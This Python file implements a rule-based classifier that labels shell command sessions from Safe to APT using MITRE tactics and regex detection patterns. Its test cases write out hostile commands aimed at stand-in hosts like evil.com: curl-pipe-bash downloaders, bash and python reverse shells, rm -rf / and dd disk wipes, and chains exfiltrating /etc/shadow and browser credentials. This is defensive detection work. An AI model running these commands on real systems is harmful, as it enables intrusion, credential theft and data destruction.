"""
Hybrid Threat Classifier v2: MITRE Rules with Refined Logic.

Key improvements over v1:
1. Check for downloader patterns before high-severity exploit rules
2. Better handling of chmod 777 (not impact, just privilege setup)
3. SSH backdoor → Destructive (not APT) when it's the primary action
4. Better Safe vs Recon distinction for low-severity discovery

Classification Logic (priority order):
1. DESTRUCTIVE: rm -rf, dd, shred, data destruction
2. APT: 4+ tactics, or (persistence + exfil), or multi-stage with C2
3. EXPLOIT: credential theft, reverse shells without download
4. DOWNLOADER: wget/curl + exec patterns, pipe-to-bash
5. RECON: nmap, network enum, discovery with severity >= 4
6. SAFE: benign commands, discovery-only with severity <= 3
"""

import sys
import pickle
import torch
import numpy as np
import re
from pathlib import Path
from typing import Dict, Tuple, List, Optional

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "src"))

from core.mitre.session_annotator import annotate_session, get_mitre_feature_columns, annotation_to_flat_dict

# =============================================================================
# Configuration
# =============================================================================

CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']
CLASS_IDS = {name: i for i, name in enumerate(CLASS_NAMES)}

MITRE_COLS = get_mitre_feature_columns()

# =============================================================================
# Pattern Matchers
# =============================================================================

# Downloader patterns (wget, curl, etc. with execution)
DOWNLOADER_PATTERNS = [
    r'wget\s+.*;\s*(chmod|\.\/)',      # wget then chmod or execute
    r'curl\s+.*;\s*(chmod|\.\/)',      # curl then chmod or execute
    r'curl\s+.*\|\s*(ba)?sh',          # curl | bash
    r'wget\s+.*\|\s*(ba)?sh',          # wget | bash
    r'wget\s+-[qO]+\s*-?\s*.*\|\s*sh', # wget -O - | sh
    r'cd\s+/tmp.*wget',                # cd /tmp; wget
    r'cd\s+/tmp.*curl',                # cd /tmp; curl
    r'tftp\s+-g',                      # tftp download
]

# Reverse shell patterns (not covered by MITRE)
REVERSE_SHELL_PATTERNS = [
    r'>\s*&\s*/dev/tcp/',              # bash reverse shell (>& /dev/tcp/)
    r'>&\s*/dev/tcp/',                 # bash reverse shell (>& /dev/tcp/)
    r'/dev/tcp/.*0>&1',                # bash reverse shell (0>&1)
    r'nc\s+.*-e\s+/bin/',              # netcat reverse shell
    r'nc\s+\S+\s+\d+\s*-e',            # netcat with port and -e
    r'mkfifo.*nc\s+',                  # mkfifo netcat shell
    r'socket.*connect.*dup2',          # python socket shell
    r'fsockopen.*exec',                # php reverse shell
    r'TCPSocket\.open.*exec',          # ruby reverse shell
    r'bash\s+-i\s+>&',                 # bash -i >& pattern
]

# Destructive patterns
DESTRUCTIVE_PATTERNS = [
    r'rm\s+-rf\s+/',                   # rm -rf /
    r'rm\s+-rf\s+/\*',                 # rm -rf /*
    r'dd\s+if=/dev/(zero|urandom)',    # disk wipe
    r'shred\s+-[uzfv]',                # shred files
    r'mkfs\.',                         # format filesystem
    r'>\s*/dev/sd[a-z]',               # overwrite disk
]

# SSH backdoor patterns
SSH_BACKDOOR_PATTERNS = [
    r'echo\s+.*ssh-rsa.*>>\s*.*authorized_keys',
    r'mkdir\s+.*\.ssh.*echo.*authorized_keys',
    r'rm\s+-rf\s+.*\.ssh.*mkdir.*\.ssh',
]

# APT persistence patterns (not well-covered by MITRE)
APT_PERSISTENCE_PATTERNS = [
    r'>>\s*~?/?(\.bashrc|\.profile|\.bash_profile)',  # shell startup files
    r'>>\s*/etc/(rc\.local|crontab|profile)',  # system startup
    r'crontab\s+-',  # crontab modification
    r'>>\s*.*/cron',  # cron file modification
    r'systemctl\s+(enable|daemon-reload)',  # systemd persistence
    r'cp\s+.*\s+/usr/(s?bin|local/bin)',  # copy to system path
]


def matches_any(text: str, patterns: List[str]) -> bool:
    """Check if text matches any of the patterns."""
    text_lower = text.lower()
    for pattern in patterns:
        if re.search(pattern, text_lower):
            return True
    return False


# =============================================================================
# MITRE Feature Extraction
# =============================================================================

def parse_commands(commands: str) -> List[str]:
    """Parse command string into list of individual commands."""
    parts = commands.replace('&&', ';').replace('||', ';').replace('\n', ';').split(';')
    return [p.strip() for p in parts if p.strip()]


def get_mitre_annotation(commands: str) -> Dict:
    """Get MITRE ATT&CK annotation for commands."""
    cmd_list = parse_commands(commands)
    return annotate_session(cmd_list)


# =============================================================================
# Hybrid Classifier v2
# =============================================================================

class HybridClassifierV2:
    """
    Improved hybrid threat classifier with refined rules.
    """
    
    def __init__(self, neural_model=None, tokenizer=None, device='cpu'):
        self.neural_model = neural_model
        self.tokenizer = tokenizer
        self.device = device
        
    def classify(self, commands: str, binary_features: Optional[np.ndarray] = None) -> Tuple[int, str, Dict]:
        """
        Classify a command sequence.
        
        Returns:
            (class_id, class_name, explanation_dict)
        """
        # Get MITRE annotation
        annotation = get_mitre_annotation(commands)
        tactic_vec = annotation['tactic_vector']
        severity_max = annotation['severity_max']
        severity_mean = annotation['severity_mean']
        kill_chain = annotation['kill_chain_score']
        technique_count = annotation['unique_technique_count']
        techniques = annotation['technique_ids']
        
        # Count active tactics
        active_tactics = [t for t, v in tactic_vec.items() if v > 0]
        num_tactics = len(active_tactics)
        
        explanation = {
            'mitre_tactics': active_tactics,
            'severity_max': severity_max,
            'severity_mean': round(severity_mean, 1),
            'kill_chain_score': kill_chain,
            'technique_count': technique_count,
            'techniques': techniques,
            'rule_matched': None,
            'confidence': 1.0,
        }
        
        # Precompute pattern matches
        is_downloader = matches_any(commands, DOWNLOADER_PATTERNS)
        is_reverse_shell = matches_any(commands, REVERSE_SHELL_PATTERNS)
        is_destructive = matches_any(commands, DESTRUCTIVE_PATTERNS)
        is_ssh_backdoor = matches_any(commands, SSH_BACKDOOR_PATTERNS)
        is_apt_persistence = matches_any(commands, APT_PERSISTENCE_PATTERNS)
        has_c2 = tactic_vec.get('command_and_control', 0) > 0
        has_execution = tactic_vec.get('execution', 0) > 0
        has_impact = tactic_vec.get('impact', 0) > 0
        has_persistence = tactic_vec.get('persistence', 0) > 0
        has_cred_access = tactic_vec.get('credential_access', 0) > 0
        has_exfiltration = tactic_vec.get('exfiltration', 0) > 0
        has_discovery = tactic_vec.get('discovery', 0) > 0
        
        # Calculate "meaningful" tactic count (exclude low-value tactics)
        # privilege_escalation from chmod and defense_evasion from cd are noise
        meaningful_tactics = [t for t in active_tactics 
                            if t not in ['privilege_escalation', 'defense_evasion'] 
                            or tactic_vec.get(t, 0) >= 2]
        num_meaningful_tactics = len(meaningful_tactics)
        
        # === RULE 0: REVERSE SHELL (highest priority for exploitation) ===
        # Check this FIRST because reverse shells can look like downloaders (C2 + execution)
        if is_reverse_shell:
            explanation['rule_matched'] = 'EXPLOIT: reverse shell pattern'
            return CLASS_IDS['Exploit'], 'Exploit', explanation
        
        # === RULE 1: APT ===
        # Check APT BEFORE destructive, because multi-stage APT may include cleanup (rm)
        # Need multiple meaningful tactics OR specific APT combinations
        
        # Pattern-based APT persistence (bashrc, crontab, etc.)
        if is_apt_persistence and has_exfiltration:
            explanation['rule_matched'] = 'APT: persistence pattern + exfiltration'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        if is_apt_persistence and has_c2:
            explanation['rule_matched'] = 'APT: persistence pattern + C2'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        if has_persistence and has_exfiltration:
            explanation['rule_matched'] = 'APT: persistence + exfiltration'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        if has_cred_access and has_c2 and has_execution:
            explanation['rule_matched'] = 'APT: credential_access + C2 + execution'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        if has_persistence and has_c2:
            explanation['rule_matched'] = 'APT: persistence + command_and_control'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        # Credential access + exfiltration (stealing and exfiltrating)
        if has_cred_access and has_exfiltration:
            explanation['rule_matched'] = 'APT: credential_access + exfiltration'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        # 4+ meaningful tactics with high severity indicates APT (but not if purely destructive)
        if num_meaningful_tactics >= 4 and severity_max >= 7 and not (has_impact and not has_exfiltration):
            explanation['rule_matched'] = f'APT: {num_meaningful_tactics} meaningful tactics + high severity'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        # === RULE 2: DESTRUCTIVE ===
        # Explicit destructive patterns (but not if primarily an APT operation)
        if is_destructive and not has_exfiltration and not has_persistence:
            explanation['rule_matched'] = 'DESTRUCTIVE: destructive command pattern'
            return CLASS_IDS['Destructive'], 'Destructive', explanation
        
        # Impact tactic with high severity (but not if primarily a download)
        if has_impact and severity_max >= 9 and not is_downloader:
            explanation['rule_matched'] = 'DESTRUCTIVE: impact tactic with severity >= 9'
            return CLASS_IDS['Destructive'], 'Destructive', explanation
        
        # SSH backdoor is destructive (replacing SSH keys)
        if is_ssh_backdoor:
            explanation['rule_matched'] = 'DESTRUCTIVE: SSH backdoor/key replacement'
            return CLASS_IDS['Destructive'], 'Destructive', explanation
        
        # === RULE 3: DOWNLOADER ===
        # Check downloader pattern (wget/curl with chmod/execute)
        if is_downloader:
            explanation['rule_matched'] = 'DOWNLOADER: download + execute pattern'
            return CLASS_IDS['Downloader'], 'Downloader', explanation
        
        # C2 + execution (without credential access = downloader, not exploit)
        if has_c2 and has_execution and not has_cred_access:
            explanation['rule_matched'] = 'DOWNLOADER: command_and_control + execution'
            return CLASS_IDS['Downloader'], 'Downloader', explanation
        
        # C2 alone (ingress tool transfer)
        if has_c2:
            explanation['rule_matched'] = 'DOWNLOADER: command_and_control present'
            return CLASS_IDS['Downloader'], 'Downloader', explanation
        
        # Credential access with high severity (shadow file, key theft)
        # But NOT if it's primarily discovery (e.g., cat /etc/passwd; find -perm -4000)
        if has_cred_access and severity_max >= 8:
            # If discovery count is >= credential_access count, it's probably recon
            if tactic_vec.get('discovery', 0) > tactic_vec.get('credential_access', 0):
                # More discovery than cred access = recon with incidental cred check
                pass
            else:
                explanation['rule_matched'] = 'EXPLOIT: credential_access with severity >= 8'
                return CLASS_IDS['Exploit'], 'Exploit', explanation
        
        # Credential access alone (any severity)
        if has_cred_access:
            # Distinguish from pure recon: /etc/passwd read alone is recon
            # /etc/shadow or ssh keys is exploit
            if severity_max >= 6:
                explanation['rule_matched'] = 'EXPLOIT: credential_access with moderate severity'
                return CLASS_IDS['Exploit'], 'Exploit', explanation
            else:
                # Low severity credential access = probably recon
                pass
        
        # Privilege escalation
        if tactic_vec.get('privilege_escalation', 0) > 0 and severity_max >= 7:
            explanation['rule_matched'] = 'EXPLOIT: privilege_escalation with severity >= 7'
            return CLASS_IDS['Exploit'], 'Exploit', explanation
        
        # === RULE 5: SAFE (check before recon for low-severity discovery) ===
        # Discovery-only with low severity (ls, pwd, whoami, etc.)
        # Even multiple techniques are safe if severity is low
        if num_tactics == 1 and has_discovery and severity_max <= 3:
            explanation['rule_matched'] = 'SAFE: discovery-only with severity <= 3'
            return CLASS_IDS['Safe'], 'Safe', explanation
        
        # === RULE 6: RECON ===
        # Credential access with discovery but low-moderate severity = recon (reading passwd, not shadow)
        if has_cred_access and has_discovery and severity_max < 9:
            # If it's primarily discovery (more discovery techniques than cred access)
            if tactic_vec.get('discovery', 0) >= tactic_vec.get('credential_access', 0):
                explanation['rule_matched'] = 'RECON: discovery + credential_access (low severity)'
                return CLASS_IDS['Recon'], 'Recon', explanation
        
        # Discovery with moderate severity (nmap, netstat, etc.)
        if has_discovery and severity_max >= 4:
            explanation['rule_matched'] = 'RECON: discovery with severity >= 4'
            return CLASS_IDS['Recon'], 'Recon', explanation
        
        # Multiple discovery TECHNIQUES (not just tactic count)
        if technique_count >= 2 and has_discovery:
            explanation['rule_matched'] = 'RECON: multiple discovery techniques'
            return CLASS_IDS['Recon'], 'Recon', explanation
        
        # Reconnaissance tactic (explicit)
        if tactic_vec.get('reconnaissance', 0) > 0:
            explanation['rule_matched'] = 'RECON: reconnaissance tactic present'
            return CLASS_IDS['Recon'], 'Recon', explanation
        
        # === RULE 7: SAFE (remaining cases) ===
        # No MITRE matches
        if technique_count == 0:
            explanation['rule_matched'] = 'SAFE: no MITRE techniques matched'
            return CLASS_IDS['Safe'], 'Safe', explanation
        
        # Few techniques with low severity (simple commands)
        if technique_count <= 3 and severity_max <= 3:
            explanation['rule_matched'] = 'SAFE: few techniques with low severity'
            return CLASS_IDS['Safe'], 'Safe', explanation
        
        # Defense evasion only with low severity
        if num_tactics == 1 and tactic_vec.get('defense_evasion', 0) > 0 and severity_max <= 4:
            explanation['rule_matched'] = 'SAFE: defense_evasion-only with low severity'
            return CLASS_IDS['Safe'], 'Safe', explanation
        
        # === FALLBACK ===
        # Use severity as final discriminator
        if severity_max >= 7:
            explanation['rule_matched'] = 'FALLBACK: high severity, assuming Exploit'
            return CLASS_IDS['Exploit'], 'Exploit', explanation
        elif severity_max >= 4:
            explanation['rule_matched'] = 'FALLBACK: moderate severity, assuming Recon'
            return CLASS_IDS['Recon'], 'Recon', explanation
        else:
            explanation['rule_matched'] = 'FALLBACK: low severity, assuming Safe'
            return CLASS_IDS['Safe'], 'Safe', explanation


# =============================================================================
# Test Cases
# =============================================================================

DIVERSE_TEST_CASES = [
    # Safe
    {"commands": "ls -la; pwd; whoami", "label": 0, "name": "Safe: basic commands"},
    {"commands": "uname -a; hostname; date", "label": 0, "name": "Safe: system info"},
    {"commands": "cat README.md; head -10 file.txt", "label": 0, "name": "Safe: file reading"},
    
    # Recon
    {"commands": "nmap -sS -p 22,80,443 192.168.1.1", "label": 1, "name": "Recon: nmap scan"},
    {"commands": "netstat -tulpn; ss -antp; arp -a", "label": 1, "name": "Recon: network enum"},
    {"commands": "cat /etc/passwd; find / -perm -4000 2>/dev/null", "label": 1, "name": "Recon: user/suid enum"},
    {"commands": "ps aux; top -bn1; who; w; last", "label": 1, "name": "Recon: process/user enum"},
    
    # Downloader
    {"commands": "wget http://evil.com/bot.sh; chmod +x bot.sh; ./bot.sh", "label": 2, "name": "Downloader: wget exec"},
    {"commands": "curl -sL http://c2.attacker.net/payload | bash", "label": 2, "name": "Downloader: curl pipe bash"},
    {"commands": "cd /tmp; wget http://192.168.1.100/xmrig; chmod 777 xmrig; ./xmrig", "label": 2, "name": "Downloader: miner"},
    
    # Exploit
    {"commands": "cat /etc/shadow; unshadow /etc/passwd /etc/shadow > hashes.txt", "label": 3, "name": "Exploit: credential theft"},
    {"commands": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "label": 3, "name": "Exploit: reverse shell"},
    {"commands": "cat ~/.ssh/id_rsa; cat ~/.bash_history | grep -i password", "label": 3, "name": "Exploit: key/history theft"},
    {"commands": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": 3, "name": "Exploit: python revshell"},
    
    # Destructive
    {"commands": "rm -rf /; rm -rf /*", "label": 4, "name": "Destructive: rm -rf /"},
    {"commands": "dd if=/dev/zero of=/dev/sda bs=1M", "label": 4, "name": "Destructive: disk wipe"},
    {"commands": "rm -rf /var/log/*; history -c; cat /dev/null > ~/.bash_history", "label": 4, "name": "Destructive: log/history wipe"},
    {"commands": "shred -u /etc/passwd /etc/shadow; rm -rf /home/*", "label": 4, "name": "Destructive: shred files"},
    {"commands": "cd ~; rm -rf .ssh; mkdir .ssh; echo 'ssh-rsa AAAA...' >> .ssh/authorized_keys", "label": 4, "name": "Destructive: SSH backdoor"},
    
    # APT
    {"commands": "uname -a; id; wget http://c2.evil.com/implant -O /tmp/.sys; chmod +x /tmp/.sys; /tmp/.sys &; echo '* * * * * /tmp/.sys' >> /var/spool/cron/root; cat /etc/shadow > /tmp/.c; curl -X POST http://c2.evil.com/exfil -d @/tmp/.c; rm /tmp/.c; history -c", "label": 5, "name": "APT: full kill chain"},
    {"commands": "hostname; curl -s http://c2/backdoor -o /tmp/.bd; chmod +x /tmp/.bd; nohup /tmp/.bd &; cp /tmp/.bd /usr/bin/.sysupdate; echo '/usr/bin/.sysupdate &' >> ~/.bashrc; cat /etc/shadow | base64 | curl -X POST http://c2/data -d @-", "label": 5, "name": "APT: persistence + exfil"},
    {"commands": "ps aux; netstat -antp; wget http://evil.com/kit.tar.gz -O /tmp/k.tgz; tar xzf /tmp/k.tgz -C /opt; echo '0 */6 * * * /opt/kit/beacon' >> /etc/crontab; sqlite3 ~/.config/google-chrome/Default/Login\\ Data 'SELECT * FROM logins' > /tmp/.b; nc evil.com 443 < /tmp/.b; rm -rf /tmp/k.tgz /tmp/.b", "label": 5, "name": "APT: toolkit + browser creds"},
]


def evaluate_hybrid_classifier():
    """Evaluate the hybrid classifier v2 on test cases."""
    print("=" * 80)
    print("HYBRID CLASSIFIER V2 EVALUATION")
    print("=" * 80)
    
    classifier = HybridClassifierV2()
    
    correct = 0
    results_by_class = {name: {'correct': 0, 'total': 0} for name in CLASS_NAMES}
    
    for tc in DIVERSE_TEST_CASES:
        expected_id = tc['label']
        expected_name = CLASS_NAMES[expected_id]
        
        pred_id, pred_name, explanation = classifier.classify(tc['commands'])
        
        is_correct = pred_id == expected_id
        if is_correct:
            correct += 1
        
        results_by_class[expected_name]['total'] += 1
        if is_correct:
            results_by_class[expected_name]['correct'] += 1
        
        status = "OK" if is_correct else "FAIL"
        print(f"\n[{status}] {tc['name']}")
        print(f"  Expected: {expected_name}, Got: {pred_name}")
        print(f"  Rule: {explanation['rule_matched']}")
        if explanation['mitre_tactics']:
            print(f"  Tactics: {explanation['mitre_tactics']}")
            print(f"  Severity: max={explanation['severity_max']}, mean={explanation['severity_mean']}")
        if not is_correct:
            print(f"  Commands: {tc['commands'][:80]}...")
    
    accuracy = correct / len(DIVERSE_TEST_CASES) * 100
    
    print(f"\n{'=' * 80}")
    print("RESULTS BY CLASS")
    print("=" * 80)
    for name in CLASS_NAMES:
        stats = results_by_class[name]
        if stats['total'] > 0:
            acc = stats['correct'] / stats['total'] * 100
            print(f"  {name}: {stats['correct']}/{stats['total']} ({acc:.0f}%)")
    
    print(f"\n{'=' * 80}")
    print(f"OVERALL ACCURACY: {correct}/{len(DIVERSE_TEST_CASES)} ({accuracy:.1f}%)")
    print("=" * 80)
    
    return accuracy


if __name__ == '__main__':
    evaluate_hybrid_classifier()
